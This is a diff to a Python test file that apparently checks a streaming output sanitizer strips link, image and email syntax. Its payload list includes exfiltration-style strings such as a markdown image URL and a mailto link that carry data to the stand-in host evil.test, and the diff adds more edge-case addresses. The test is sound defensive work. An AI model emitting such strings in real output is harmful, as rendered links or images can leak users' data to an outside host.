@@ -11,6 +11,7 @@ PAYLOADS = [
     "![c](https://evil.test/c?d=" + "9" * 600 + ")",
     "Source: <http:evil.test/?d=AAPL_60000> and <mailto:x@evil.test?body=63313>",
     "Mail AAPL6000@evil.test for details",
+    "Mail AAPL-6000-@evil.test or x.@evil.test or a@-evil.test",
 ]
 
 
@@ -29,7 +30,7 @@ def test_no_link_or_image_syntax_survives_streaming(payload, size):
     assert "://" not in out
     assert "www." not in out.lower()
     assert re.search(r"<[A-Za-z]", out) is None
-    assert re.search(r"\w@\w", out) is None
+    assert re.search(r"\S@\S", out) is None
 
 
 def test_plain_text_comparisons_and_cjk_pass_through():
